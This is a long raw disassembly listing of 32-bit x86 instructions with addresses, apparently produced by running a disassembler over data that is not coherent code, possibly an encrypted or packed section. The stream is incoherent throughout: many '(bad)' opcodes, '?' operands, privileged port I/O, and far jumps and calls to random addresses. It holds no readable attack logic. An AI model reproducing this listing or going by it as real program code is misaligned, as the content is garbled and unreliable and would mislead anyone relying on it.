  4106da:	icebp  
  4106db:	pop    edx
  4106dc:	mov    bh,0xc1
  4106de:	add    eax,0x19460d73
  4106e3:	add    eax,0xa0ba87bb
  4106e8:	inc    esp
  4106e9:	int3   
  4106ea:	and    al,0x34
  4106ec:	pushf  
  4106ed:	(bad)  
  4106ee:	out    dx,al
  4106ef:	out    dx,al
  4106f0:	test   BYTE PTR ds:0x67232e8e,0x33
  4106f7:	mov    edx,edx
  4106f9:	nop
  4106fa:	mov    ch,0x83
  4106fc:	rcl    BYTE PTR [esp+edx*2+0x54],1
  410700:	or     ch,BYTE PTR [ebp+ebx*2+0x7e]
  410704:	mov    ds:0x784aa597,eax
  410709:	test   eax,0x1f6ab259
  41070f:	arpl   WORD PTR [eax],sp
  410711:	ret    
  410712:	mov    dh,BYTE PTR [eax]
  410714:	aas    
  410715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410716:	or     eax,esp
  410718:	sbb    eax,0xa1c16da2
  41071d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41071e:	pop    edi
  41071f:	dec    esp
  410720:	rcl    DWORD PTR [eax+0x77],1
  410723:	push   esp
  410724:	cmp    eax,0x4e80c0c1
  410729:	pop    edi
  41072a:	add    al,0x3b
  41072c:	jns    0x410727
  41072e:	popa   
  41072f:	ror    al,0xbd
  410732:	push   eax
  410733:	test   esi,esp
  410735:	mov    bl,0xca
  410737:	jbe    0x4107a7
  410739:	daa    
  41073a:	fstp   QWORD PTR [edx-0x1d]
  41073d:	pop    ebp
  41073e:	xor    edi,DWORD PTR [esi+0x376809cc]
  410744:	cbw    
  410746:	or     ebx,esi
  410748:	aam    0x7
  41074a:	dec    ebx
  41074b:	rcl    BYTE PTR [eax-0xc],0x5
  41074f:	out    dx,eax
  410750:	sub    BYTE PTR [ebx-0x2],dh
  410753:	(bad)  
  410755:	(bad)  
  410756:	xor    eax,0x765b3e9b
  41075b:	lods   eax,DWORD PTR ds:[esi]
  41075c:	popa   
  41075d:	fnstcw WORD PTR [eax-0x73481b28]
  410763:	mov    bh,0x62
  410765:	jnp    0x410716
  410767:	xchg   ecx,eax
  410768:	enter  0x9390,0xb7
  41076c:	mov    gs,esi
  41076e:	pop    es
  41076f:	xor    bh,ch
  410771:	popa   
  410772:	mov    ebx,?
  410774:	mov    DWORD PTR [esi+0x5cf002f1],ebx
  41077a:	aaa    
  41077b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41077c:	and    al,0x6d
  41077e:	popa   
  41077f:	adc    esp,DWORD PTR [eax+edi*1]
  410782:	jno    0x4107c0
  410784:	and    cl,dl
  410786:	jp     0x410716
  410788:	xor    eax,0xf72c127b
  41078d:	cli    
  41078e:	mov    bh,0x36
  410790:	div    cl
  410792:	fcomp  QWORD PTR [edi-0x4adac9fa]
  410798:	ret    0xfcbf
  41079b:	retf   
  41079c:	stos   BYTE PTR es:[edi],al
  41079d:	dec    ebp
  41079e:	rcl    BYTE PTR [ebx],cl
  4107a0:	mov    esi,0xaafc0d69
  4107a5:	dec    ebx
  4107a6:	retf   0x5b39
  4107a9:	cmp    cl,BYTE PTR [ebx+0x7]
  4107ac:	(bad)  
  4107ad:	pop    ds
  4107ae:	push   es
  4107af:	lock out dx,eax
  4107b1:	retf   
  4107b2:	cs sahf 
  4107b4:	inc    ecx
  4107b5:	mov    ebp,0x61176689
  4107ba:	sub    eax,0x7bc19454
  4107bf:	mov    ch,0xa7
  4107c1:	in     al,dx
  4107c2:	stos   DWORD PTR es:[edi],eax
  4107c3:	dec    esp
  4107c4:	xlat   BYTE PTR ds:[ebx]
  4107c5:	(bad)  
  4107c6:	mov    edx,0x1664bdf8
  4107cb:	xchg   esp,eax
  4107cc:	sti    
  4107cd:	xor    al,0x40
  4107cf:	xchg   esi,eax
  4107d0:	ret    
  4107d1:	(bad)  
  4107d2:	push   eax
  4107d3:	pop    es
  4107d4:	mov    ds:0xaea70ed5,al
  4107d9:	nop
  4107da:	jmp    0x221753a7
  4107df:	test   al,0x3e
  4107e1:	in     eax,0xab
  4107e3:	cmp    al,0x5f
  4107e5:	add    edx,ebx
  4107e7:	pop    esp
  4107e8:	scas   al,BYTE PTR es:[edi]
  4107e9:	in     al,dx
  4107ea:	push   edi
  4107eb:	sub    ah,BYTE PTR [edi-0x77e95871]
  4107f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107f2:	lahf   
  4107f3:	push   edi
  4107f4:	pop    DWORD PTR [esi]
  4107f6:	inc    edi
  4107f7:	mov    al,0x6
  4107f9:	sbb    dh,BYTE PTR [edi-0x4d]
  4107fc:	push   0x16283590
  410801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410802:	test   DWORD PTR [esp+edx*2+0x3b],ecx
  410806:	cli    
  410807:	xor    ch,BYTE PTR ds:0x3b1f9412
  41080d:	jb     0x41086a
  41080f:	enter  0xef86,0x5f
  410813:	xor    dh,al
  410815:	mov    ebp,0x42b38f0c
  41081a:	popf   
  41081b:	push   ecx
  41081c:	jb     0x410807
  41081e:	sub    al,0x6c
  410820:	test   DWORD PTR [ebx],edi
  410822:	mov    bl,al
  410824:	(bad)  
  410825:	js     0x4107c8
  410827:	ins    DWORD PTR es:[edi],dx
  410828:	and    al,0xf8
  41082a:	xor    al,0x35
  41082c:	adc    edx,esp
  41082e:	or     eax,0x254a40ac
  410833:	jg     0x410834
  410835:	not    al
  410837:	in     al,dx
  410838:	or     bl,BYTE PTR [ecx+0x66]
  41083b:	loop   0x4107c1
  41083d:	or     BYTE PTR ds:0xf3871073,dh
  410844:	loope  0x4107e2
  410846:	ja     0x410807
  410848:	in     al,dx
  410849:	xchg   edx,eax
  41084a:	jmp    0x410828
  41084c:	leave  
  41084d:	inc    ebp
  41084e:	adc    ah,cl
  410850:	je     0x4107db
  410852:	repnz (bad) 
  410854:	stc    
  410855:	aam    0x24
  410857:	mov    ah,0xca
  410859:	and    eax,0x38add614
  41085e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41085f:	dec    edx
  410860:	mov    esp,0xad262b56
  410865:	(bad)  
  410866:	jnp    0x4108b7
  410868:	pop    es
  410869:	adc    BYTE PTR [ebp+0x4e],bl
  41086c:	fdivp  st(0),st
  41086e:	aaa    
  41086f:	inc    ebx
  410870:	mov    dh,0x5b
  410872:	out    dx,al
  410873:	lods   eax,DWORD PTR ds:[esi]
  410874:	push   edx
  410875:	jno    0x410865
  410877:	jne    0x41085c
  410879:	dec    esp
  41087a:	neg    DWORD PTR [ebx+0x2b89de3e]
  410880:	cli    
  410881:	xchg   ecx,eax
  410882:	xor    DWORD PTR [edx+0x62825115],0x74
  410889:	push   0x3e
  41088b:	(bad)  
  41088c:	rcl    DWORD PTR [eax+edi*1-0x62],1
  410890:	or     eax,0x3557e7ec
  410895:	lahf   
  410896:	shl    esi,cl
  410898:	dec    eax
  410899:	xchg   ecx,eax
  41089a:	rol    DWORD PTR [ecx-0xe],0x7e
  41089e:	push   ebx
  41089f:	scas   al,BYTE PTR es:[edi]
  4108a0:	mov    cl,0xad
  4108a2:	sub    DWORD PTR [ebx+0x5b570ebf],edi
  4108a8:	sbb    cl,ah
  4108aa:	int    0x82
  4108ac:	es sub eax,0x64bbe084
  4108b2:	xor    esi,DWORD PTR [edx]
  4108b4:	out    0x59,eax
  4108b6:	mov    ah,0x52
  4108b8:	mov    edx,0xb72407c8
  4108bd:	adc    BYTE PTR [edx-0x6e67dc82],ah
  4108c3:	fxch   st(7)
  4108c5:	mov    dh,0x70
  4108c7:	int3   
  4108c8:	push   cs
  4108c9:	cdq    
  4108ca:	push   esp
  4108cb:	add    ebp,DWORD PTR [ebx-0x5e]
  4108ce:	lods   eax,DWORD PTR ds:[esi]
  4108cf:	(bad)  
  4108d0:	jne    0x4108d6
  4108d2:	(bad)  
  4108d3:	pop    ss
  4108d4:	sbb    bl,0x82
  4108d7:	pop    esp
  4108d8:	fwait
  4108d9:	mov    WORD PTR [edi],gs
  4108db:	or     eax,0x7fccc15d
  4108e0:	xor    DWORD PTR [ebp+0x1f],edi
  4108e3:	in     eax,0x1f
  4108e5:	push   0x573fc602
  4108ea:	fxam   
  4108ec:	mov    WORD PTR [eax-0x1e00ab53],?
  4108f2:	xchg   ebx,eax
  4108f3:	sub    edi,DWORD PTR [eax-0x48f6208f]
  4108f9:	lods   eax,DWORD PTR ds:[esi]
  4108fa:	mov    al,0x4
  4108fc:	push   ecx
  4108fd:	inc    edi
  4108fe:	addr16 bnd jne 0x410918
  410902:	leave  
  410903:	mov    edx,0x83131a64
  410908:	mov    ds:0x59683f80,al
  41090d:	push   0xffffff81
  41090f:	ins    DWORD PTR es:[edi],dx
  410910:	sahf   
  410911:	jo     0x410906
  410913:	adc    BYTE PTR [edx],dl
  410915:	in     al,dx
  410916:	pop    edi
  410917:	stc    
  410918:	cmp    al,0x6b
  41091a:	xchg   DWORD PTR [ebp-0x2ea0e3eb],esi
  410920:	loop   0x41096d
  410922:	aad    0x66
  410924:	jle    0x410943
  410926:	lods   eax,DWORD PTR ds:[esi]
  410927:	cmp    esp,ecx
  410929:	es sub ah,bl
  41092c:	enter  0xb6b4,0x29
  410930:	xor    edi,DWORD PTR [edx+ebp*4]
  410933:	or     BYTE PTR [eax-0x45],al
  410936:	jle    0x41092e
  410938:	loopne 0x410980
  41093a:	and    DWORD PTR [esp+edi*2],ebp
  41093d:	std    
  41093e:	test   eax,0x5dd7297f
  410943:	js     0x4109b9
  410945:	jp     0x41098e
  410947:	push   edi
  410948:	dec    eax
  410949:	imul   BYTE PTR [ebp+0x1eeed762]
  41094f:	iret   
  410950:	dec    ebx
  410951:	xor    ch,BYTE PTR [eax+0x5fcb00a0]
  410957:	add    DWORD PTR [esi+ebx*2+0x7ef388e9],ebx
  41095e:	xchg   edi,eax
  41095f:	into   
  410960:	aaa    
  410961:	pop    edi
  410962:	adc    al,0x7d
  410964:	and    al,0x95
  410966:	test   al,0x57
  410968:	or     dh,BYTE PTR ds:[esi+0x16e4c8c2]
  41096f:	cdq    
  410970:	lds    esi,FWORD PTR [ebp+0x5672d374]
  410976:	mov    ecx,0x8525f139
  41097b:	sbb    bh,dh
  41097d:	fisub  WORD PTR [eax-0x1a]
  410980:	bound  ebp,QWORD PTR [eax+eiz*8+0x196e2f71]
  410987:	mov    edx,DWORD PTR ds:[edi+0x39]
  41098b:	or     BYTE PTR [edx+0xf],0x8c
  41098f:	les    ecx,FWORD PTR [esi-0x63]
  410992:	retf   
  410993:	bound  ebp,QWORD PTR [edi+0x566d77b7]
  410999:	sbb    al,0xea
  41099b:	sub    eax,0x6e017b7f
  4109a0:	push   edx
  4109a1:	or     al,0x64
  4109a3:	imul   esi,eax,0xffffffc0
  4109a6:	rcl    DWORD PTR [ecx-0x341b06db],1
  4109ac:	and    BYTE PTR [ecx-0x3a4addd0],ah
  4109b2:	inc    ebx
  4109b3:	mov    edi,0xb80d80b2
  4109b8:	int3   
  4109b9:	lods   eax,DWORD PTR ds:[esi]
  4109ba:	shl    ah,cl
  4109bc:	mov    edx,0xe05806a8
  4109c1:	lock and BYTE PTR [ebx],al
  4109c4:	and    eax,0xbbe2106e
  4109c9:	xor    al,0x57
  4109cb:	sbb    BYTE PTR [edx+edx*1+0x26],bh
  4109cf:	xchg   edx,eax
  4109d0:	inc    ecx
  4109d1:	dec    ebp
  4109d2:	icebp  
  4109d3:	outs   dx,BYTE PTR ds:[esi]
  4109d4:	stos   DWORD PTR es:[edi],eax
  4109d5:	and    ebp,0x6b
  4109d8:	push   ds
  4109d9:	mov    edx,0x713bff61
  4109de:	clc    
  4109df:	test   al,0xd0
  4109e1:	and    ebx,esi
  4109e3:	mov    ch,0x7d
  4109e5:	xlat   BYTE PTR ds:[ebx]
  4109e6:	arpl   WORD PTR [esp+esi*4+0x1cb0a9d1],si
  4109ed:	dec    eax
  4109ee:	and    DWORD PTR [ebp-0x1a7f85ba],edx
  4109f4:	mov    bh,0xb9
  4109f6:	inc    ebx
  4109f7:	dec    esi
  4109f8:	and    BYTE PTR [esi],bh
  4109fa:	mov    ch,0x7
  4109fc:	scas   al,BYTE PTR es:[edi]
  4109fd:	ret    
  4109fe:	shl    BYTE PTR [ecx+ebp*2],1
  410a01:	sbb    eax,0xc2521f65
  410a06:	mov    esi,0x4db50a41
  410a0b:	mov    cl,0xb6
  410a0d:	je     0x410992
  410a0f:	cmp    eax,0xdcf38af8
  410a14:	sub    eax,0xe97ed0ba
  410a19:	jmp    0xe219:0x6df22888
  410a20:	cmp    al,0xa4
  410a22:	shl    esi,cl
  410a24:	pop    eax
  410a25:	sub    edx,DWORD PTR [ebp-0x7d6e6fa6]
  410a2b:	ror    DWORD PTR [eax],cl
  410a2d:	mov    esp,0x11573aec
  410a32:	push   ebp
  410a33:	mov    cl,0x6a
  410a35:	mov    BYTE PTR [edx+0x1d],ah
  410a38:	pop    es
  410a39:	(bad)  
  410a3a:	ja     0x4109d0
  410a3c:	pop    edi
  410a3d:	push   edi
  410a3e:	loope  0x410aa7
  410a40:	jmp    0x3d6708de
  410a45:	imul   eax,DWORD PTR [edx],0xffffffbe
  410a48:	xchg   ebx,eax
  410a49:	xor    al,dl
  410a4b:	or     DWORD PTR [esi-0x21],esi
  410a4e:	or     bl,BYTE PTR [edx+0x3712cb11]
  410a54:	sbb    DWORD PTR [ebx],ebp
  410a56:	mov    DWORD PTR [esp+edi*2+0x458b8a1a],0xf163727c
  410a61:	push   ds
  410a62:	rol    BYTE PTR [ebx+0x3306d28a],1
  410a68:	pop    ss
  410a69:	daa    
  410a6a:	cmc    
  410a6b:	xchg   edx,eax
  410a6c:	xchg   edx,eax
  410a6d:	(bad)  
  410a6e:	mov    ds:0xb844f233,eax
  410a73:	inc    esp
  410a74:	xchg   ebp,eax
  410a75:	jmp    0x410ae4
  410a77:	push   cs
  410a78:	aad    0x7
  410a7a:	sar    DWORD PTR [edi],0xbc
  410a7d:	and    esp,ecx
  410a7f:	xchg   edi,eax
  410a80:	imul   ebp,DWORD PTR [eax-0x21],0xffffff8f
  410a84:	fimul  DWORD PTR [esi+0x250a4e94]
  410a8a:	ret    0x6a0d
  410a8d:	mov    bh,0xde
  410a8f:	mov    es,ecx
  410a91:	and    al,0xc9
  410a93:	ret    
  410a94:	fdivr  DWORD PTR [ebx+0x4da616ff]
  410a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a9b:	push   ss
  410a9c:	repz sbb esp,DWORD PTR [edi+0x3c]
  410aa0:	lea    ecx,ds:0x8d212d51
  410aa6:	aad    0x7c
  410aa8:	cmp    cl,bh
  410aaa:	fldenv [esi+ebp*8-0x64dae60c]
  410ab1:	and    al,0xf5
  410ab3:	dec    eax
  410ab4:	mov    esi,0x20870d1
  410ab9:	xchg   edx,eax
  410aba:	mov    bl,BYTE PTR [esi+0x5e]
  410abd:	add    DWORD PTR [esi-0x39],ebp
  410ac0:	xchg   esp,eax
  410ac1:	daa    
  410ac2:	sbb    eax,DWORD PTR [eax+0x7b]
  410ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac6:	push   es
  410ac7:	fwait
  410ac8:	pushf  
  410ac9:	retf   
  410aca:	mov    dh,0x55
  410acc:	push   ecx
  410acd:	bound  esi,QWORD PTR [esi+0x3a]
  410ad0:	cli    
  410ad1:	adc    BYTE PTR [esi],ch
  410ad3:	into   
  410ad4:	arpl   WORD PTR [esi+0x7173ef5a],dx
  410ada:	rcl    BYTE PTR [ebp+0x48],0xc6
  410ade:	jno    0x410b58
  410ae0:	shl    DWORD PTR [ebx],cl
  410ae2:	add    BYTE PTR [edi+0x26bd480c],0xd4
  410ae9:	stos   BYTE PTR es:[edi],al
  410aea:	(bad)  
  410aec:	mov    ds,WORD PTR [esp+eax*8+0x75d7948c]
  410af3:	mov    al,0x74
  410af5:	mov    dh,0xe4
  410af7:	into   
  410af8:	js     0x410b74
  410afa:	mov    ch,0xa5
  410afc:	pop    esp
  410afd:	push   ss
  410afe:	and    ebx,eax
  410b00:	mov    eax,0xcbb99073
  410b05:	(bad)  
  410b06:	fyl2x  
  410b08:	int3   
  410b09:	pop    es
  410b0a:	sub    ebp,esp
  410b0c:	sub    al,0xf1
  410b0e:	add    DWORD PTR [ebx],esp
  410b10:	test   dl,dl
  410b12:	cs (bad) 
  410b14:	jl     0x410b63
  410b16:	cwde   
  410b17:	ins    DWORD PTR es:[edi],dx
  410b18:	nop
  410b19:	in     al,0xfc
  410b1b:	or     ah,BYTE PTR [edx+0x60]
  410b1e:	mov    bh,dl
  410b20:	sub    BYTE PTR [edi],cl
  410b22:	retf   0x6e93
  410b25:	push   esi
  410b26:	xchg   bx,ax
  410b28:	pop    esi
  410b29:	(bad)  
  410b2a:	ds (bad) 
  410b2e:	mov    bh,BYTE PTR [edx]
  410b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b31:	cmp    BYTE PTR [esi-0x6f],cl
  410b34:	mov    ebp,DWORD PTR [edx+0x6d501639]
  410b3a:	mov    ebx,DWORD PTR [ebx+0x14c79261]
  410b40:	sub    BYTE PTR [ecx-0x76261599],dl
  410b46:	pushf  
  410b47:	enter  0x5353,0x49
  410b4b:	inc    ebp
  410b4c:	test   cl,0x86
  410b4f:	loope  0x410b6a
  410b51:	jne    0x410adb
  410b53:	or     DWORD PTR [edi+eax*2+0x41fab57e],eax
  410b5a:	clc    
  410b5b:	adc    DWORD PTR [edx+0x7ebc93ad],esp
  410b61:	imul   edi,DWORD PTR [esi+0x7b],0x68
  410b65:	out    dx,eax
  410b66:	jmp    0xdcc84544
  410b6b:	push   edi
  410b6c:	(bad)  
  410b6d:	int    0x90
  410b6f:	mov    ebp,0xbb0255eb
  410b74:	inc    edx
  410b75:	mov    al,0xcf
  410b77:	lods   al,BYTE PTR ds:[esi]
  410b78:	mov    ah,0x75
  410b7a:	and    eax,0x2dc2c998
  410b7f:	into   
  410b80:	jno    0x410b6e
  410b82:	out    dx,eax
  410b83:	add    al,BYTE PTR [edi]
  410b85:	mov    esp,0x3ce0f93b
  410b8a:	adc    DWORD PTR [ecx+0x4],esi
  410b8d:	sbb    ecx,DWORD PTR [ecx+edx*4]
  410b90:	iret   
  410b91:	inc    edx
  410b92:	pop    eax
  410b93:	add    BYTE PTR [edi-0x2120b173],dh
  410b99:	jne    0x410b6d
  410b9b:	stos   BYTE PTR es:[edi],al
  410b9c:	and    DWORD PTR [eax-0x30],esp
  410b9f:	ds push esi
  410ba1:	imul   eax,DWORD PTR [edi+0x5e181cc1],0xffffff82
  410ba8:	push   edi
  410ba9:	out    dx,eax
  410baa:	adc    ebx,edx
  410bac:	cmp    eax,0x5648ab0c
  410bb1:	inc    ebp
  410bb2:	jl     0x410b9a
  410bb4:	jb     0x410b6d
  410bb6:	call   0x7b979e02
  410bbb:	mov    esp,0xb36ce515
  410bc0:	mov    ebx,0xc3f3faf1
  410bc5:	mov    ecx,esp
  410bc7:	xchg   dh,al
  410bc9:	out    0xd8,al
  410bcb:	pop    edi
  410bcc:	adc    DWORD PTR [esi+0x2343713b],esi
  410bd2:	ror    BYTE PTR [edi],cl
  410bd4:	mov    ebx,?
  410bd6:	ret    0xd91f
  410bd9:	arpl   WORD PTR [edi-0x792c4cf1],bx
  410bdf:	stc    
  410be0:	retf   0x28f4
  410be3:	jns    0x410bbf
  410be5:	outs   dx,BYTE PTR ds:[esi]
  410be6:	xor    eax,0xb89776f1
  410beb:	jl     0x410c07
  410bed:	jle    0x410c6d
  410bef:	push   ecx
  410bf0:	pop    esp
  410bf1:	icebp  
  410bf2:	sbb    bh,BYTE PTR [ebx-0x1dcaa941]
  410bf8:	xchg   ebp,eax
  410bf9:	sbb    DWORD PTR [ecx],ebp
  410bfb:	cmp    DWORD PTR [eax],0xf130be41
  410c01:	loopne 0x410b99
  410c03:	ja     0x410bfa
  410c05:	shl    DWORD PTR [esi+0x28],1
  410c08:	xor    edi,DWORD PTR [edx]
  410c0a:	adc    cl,BYTE PTR [edi]
  410c0c:	push   cs
  410c0d:	bound  ecx,QWORD PTR cs:[ebp+0x27]
  410c11:	xchg   edi,eax
  410c12:	mov    bh,BYTE PTR [ebx+0x0]
  410c15:	cwde   
  410c16:	std    
  410c17:	sbb    dh,cl
  410c19:	sar    BYTE PTR [ebx],0xf0
  410c1c:	xor    DWORD PTR [esi+0x5c0fecda],edx
  410c22:	dec    esp
  410c23:	icebp  
  410c24:	aas    
  410c25:	dec    edx
  410c26:	daa    
  410c27:	out    dx,al
  410c28:	jae    0x410bbb
  410c2a:	jns    0x410c8e
  410c2c:	sbb    al,0x2e
  410c2e:	sbb    edi,0x71
  410c31:	adc    DWORD PTR [ebp+ecx*1-0x76bee0a7],esp
  410c38:	cmp    dh,BYTE PTR [ecx]
  410c3a:	push   0xffffffd1
  410c3c:	or     DWORD PTR [edi],ebp
  410c3e:	test   BYTE PTR [ecx],dl
  410c40:	mov    edi,0x1fc72605
  410c45:	shl    BYTE PTR [esi],0xcd
  410c48:	fdivr  DWORD PTR [ebp-0x1c]
  410c4b:	jns    0x410c62
  410c4d:	sub    esi,0x53
  410c50:	sub    bh,bl
  410c52:	mov    esp,0xe21469f8
  410c57:	push   esp
  410c58:	xor    al,0x7a
  410c5a:	mov    eax,gs:0x870f43ea
  410c60:	popa   
  410c61:	sbb    BYTE PTR ds:0xd0bac1cb,bh
  410c67:	inc    ecx
  410c68:	ret    
  410c69:	enter  0x70b3,0xac
  410c6d:	and    esp,eax
  410c6f:	mov    bl,0x11
  410c71:	sub    BYTE PTR ds:0xce17255d,al
  410c77:	es mov ebx,0x552a7be6
  410c7d:	and    al,0x36
  410c7f:	jl     0x410ce4
  410c81:	(bad)  
  410c82:	dec    BYTE PTR [edx+0x47]
  410c85:	ins    BYTE PTR es:[edi],dx
  410c86:	popf   
  410c87:	in     eax,dx
  410c88:	sahf   
  410c89:	mov    dl,0x39
  410c8b:	stos   DWORD PTR es:[edi],eax
  410c8c:	mov    eax,ds:0x6b99b113
  410c91:	jbe    0x410c69
  410c93:	and    BYTE PTR [ecx],dh
  410c95:	in     eax,dx
  410c96:	push   ebp
  410c97:	rcr    BYTE PTR [eax+0x1b6d4e1e],cl
  410c9d:	enter  0x5c73,0x22
  410ca1:	sub    DWORD PTR [eax],0x4c
  410ca4:	test   BYTE PTR [ecx+esi*2-0x7a00b726],cl
  410cab:	inc    edx
  410cac:	scas   al,BYTE PTR es:[edi]
  410cad:	pop    esp
  410cae:	mov    eax,ds:0x47427e13
  410cb3:	out    0x14,eax
  410cb5:	mov    edx,0xfe2b813c
  410cba:	jmp    0x22c583b1
  410cbf:	stos   DWORD PTR es:[edi],eax
  410cc0:	jno    0x410cc7
  410cc2:	mov    ds:0xae28eee8,al
  410cc7:	sti    
  410cc8:	push   ss
  410cc9:	xchg   ebx,eax
  410cca:	icebp  
  410ccb:	mov    eax,0x303a4406
  410cd0:	jnp    0x410d4c
  410cd2:	call   FWORD PTR [ebp-0x54627a5d]
  410cd8:	call   0x4e8d8408
  410cdd:	push   edx
  410cde:	adc    al,0xaa
  410ce0:	outs   dx,BYTE PTR ds:[esi]
  410ce1:	fild   WORD PTR [ebp-0x498da195]
  410ce7:	jmp    0x57bc:0x49cf3629
  410cee:	test   DWORD PTR [edi-0x4a],ebp
  410cf1:	test   DWORD PTR [esi-0x34],esp
  410cf4:	enter  0xf9cb,0x29
  410cf8:	cmc    
  410cf9:	xchg   esi,eax
  410cfa:	mov    WORD PTR [eax-0x1e311a19],?
  410d00:	loope  0x410ce4
  410d02:	xchg   esi,eax
  410d03:	mov    cs,esi
  410d05:	mov    edx,edx
  410d07:	dec    ecx
  410d08:	xchg   edx,eax
  410d09:	call   0xfc7d:0xf937893f
  410d10:	and    BYTE PTR [eax-0x36b48582],0xfb
  410d17:	pop    ss
  410d18:	mov    ebx,0x569025ad
  410d1d:	es push ebx
  410d1f:	and    al,0x4b
  410d21:	retf   
  410d22:	and    esp,ecx
  410d24:	gs mov edx,0x579ded8f
  410d2a:	jmp    0x410d40
  410d2c:	sub    ecx,edx
  410d2e:	push   ds
  410d2f:	rcr    BYTE PTR [ebx+ecx*1+0x4f],cl
  410d33:	fisttp QWORD PTR [esi]
  410d35:	out    0xea,eax
  410d37:	fadd   QWORD PTR [eax+edx*8-0x5]
  410d3b:	cmp    DWORD PTR [esi],edx
  410d3d:	scas   al,BYTE PTR es:[edi]
  410d3e:	cld    
  410d3f:	jmp    0x410d52
  410d41:	ret    
  410d42:	inc    ecx
  410d43:	std    
  410d44:	adc    cl,bh
  410d46:	stos   BYTE PTR es:[edi],al
  410d47:	(bad)  
  410d48:	and    eax,0xaab26952
  410d4d:	add    al,0xfa
  410d4f:	ja     0x410d87
  410d51:	daa    
  410d52:	or     BYTE PTR [edi-0xa56eb3f],dh
  410d58:	retf   0x7ca2
  410d5b:	out    0xb5,al
  410d5d:	(bad)  
  410d5e:	cmc    
  410d5f:	enter  0x411b,0x46
  410d63:	sbb    al,0x3c
  410d65:	iret   
  410d66:	xlat   BYTE PTR ds:[ebx]
  410d67:	adc    dh,cl
  410d69:	cmp    eax,0xd0a4c5c5
  410d6e:	icebp  
  410d6f:	add    ebp,DWORD PTR [eax]
  410d71:	in     al,dx
  410d72:	cmp    al,0xd
  410d74:	xchg   BYTE PTR [eax+0x3a149b92],dl
  410d7a:	in     eax,dx
  410d7b:	dec    ebx
  410d7c:	in     eax,0x35
  410d7e:	xchg   esp,eax
  410d7f:	into   
  410d80:	addr16 mov ecx,0x57e3a2ac
  410d86:	sti    
  410d87:	mov    eax,0xd76e7cbb
  410d8c:	stos   DWORD PTR es:[edi],eax
  410d8d:	mov    ebx,0xa12e9679
  410d92:	cmp    bl,0x8
  410d95:	dec    ebp
  410d96:	mov    ecx,0x3f837b7f
  410d9b:	iret   
  410d9c:	push   esi
  410d9d:	inc    eax
  410d9e:	mov    eax,0x42f3d17d
  410da3:	or     eax,0x3e27a450
  410da8:	out    0xdf,eax
  410daa:	mov    ebx,0xbe146b94
  410daf:	mov    ecx,0xa6480744
  410db4:	hlt    
  410db5:	jnp    0x410e28
  410db7:	rol    eax,cl
  410db9:	cmp    DWORD PTR [eax+0x4c],esp
  410dbc:	cli    
  410dbd:	xchg   edi,eax
  410dbe:	(bad)  [edx-0x1]
  410dc1:	out    0xe6,al
  410dc3:	dec    ebx
  410dc4:	aaa    
  410dc5:	push   cs
  410dc6:	test   al,0x51
  410dc8:	or     al,0x5d
  410dca:	fmul   QWORD PTR [edx-0x67]
  410dcd:	mov    al,ds:0x3449d073
  410dd2:	shr    BYTE PTR [ebx+0x36],0x3a
  410dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd7:	inc    esp
  410dd8:	sbb    BYTE PTR [esi-0x20],cl
  410ddb:	push   edi
  410ddc:	repz add eax,0x3068b12f
  410de2:	imul   eax,DWORD PTR [ecx+eax*8],0xffffffc6
  410de6:	sbb    dl,BYTE PTR [eax]
  410de8:	call   0x8cc0:0x4e33aaaa
  410def:	or     eax,0xbe79003
  410df4:	and    ebx,edi
  410df6:	push   ss
  410df7:	adc    dh,BYTE PTR [edx+0x36]
  410dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dfb:	jl     0x410e14
  410dfd:	push   ebx
  410dfe:	pop    ebp
  410dff:	das    
  410e00:	xchg   ebp,eax
  410e01:	mov    eax,0xbcf86987
  410e06:	pop    ebx
  410e07:	test   eax,0x838df5f
  410e0c:	leave  
  410e0d:	and    ecx,esp
  410e0f:	or     al,0x69
  410e11:	repz pop ebx
  410e13:	test   BYTE PTR [ebx+0x4b],ah
  410e16:	pop    ss
  410e17:	adc    eax,0xae7ecab6
  410e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e1d:	push   ds
  410e1e:	fsub   DWORD PTR [esi]
  410e20:	dec    eax
  410e21:	jecxz  0x410da9
  410e23:	arpl   bx,ax
  410e25:	jecxz  0x410ea2
  410e27:	xchg   edx,eax
  410e28:	mov    edi,0x7dd88561
  410e2d:	jecxz  0x410e23
  410e2f:	cmp    dl,ah
  410e31:	ret    0xf4f4
  410e34:	(bad)  
  410e35:	cmp    ah,BYTE PTR [ecx+ecx*4+0x7ab6c305]
  410e3c:	cmc    
  410e3d:	mov    dh,0xb2
  410e3f:	jmp    0x15b06f81
  410e44:	loopne 0x410eb5
  410e46:	icebp  
  410e47:	add    al,0x1f
  410e49:	push   esp
  410e4a:	pop    eax
  410e4b:	das    
  410e4c:	stos   BYTE PTR es:[edi],al
  410e4d:	inc    edx
  410e4e:	cdq    
  410e4f:	call   0x8653:0x4d5a85c2
  410e56:	and    DWORD PTR [ebx+esi*8-0x73],0xdc644547
  410e5e:	push   ds
  410e5f:	jecxz  0x410ea9
  410e61:	jb     0x410e73
  410e63:	test   ch,cl
  410e65:	mov    al,fs:0x69f384c1
  410e6b:	and    al,0xee
  410e6d:	in     eax,dx
  410e6e:	push   ss
  410e6f:	in     eax,0x8c
  410e71:	loope  0x410ec2
  410e73:	imul   esp,DWORD PTR ss:[edi+0x361f84fd],0xffffffb7
  410e7b:	sub    DWORD PTR [ecx],esp
  410e7d:	daa    
  410e7e:	mov    ds:0x6a9baea4,al
  410e83:	test   BYTE PTR [ecx-0x43],dl
  410e86:	sar    eax,1
  410e88:	mov    bh,0xb5
  410e8a:	es call 0x907f:0x415d50cc
  410e92:	push   eax
  410e93:	fwait
  410e94:	jae    0x410e9c
  410e96:	and    BYTE PTR [esp+edi*4-0x6e32fb6],0x71
  410e9e:	fnstsw WORD PTR [eax+0x3358f5a5]
  410ea4:	inc    edi
  410ea5:	mov    ds:0xb54f8fd5,eax
  410eaa:	dec    edx
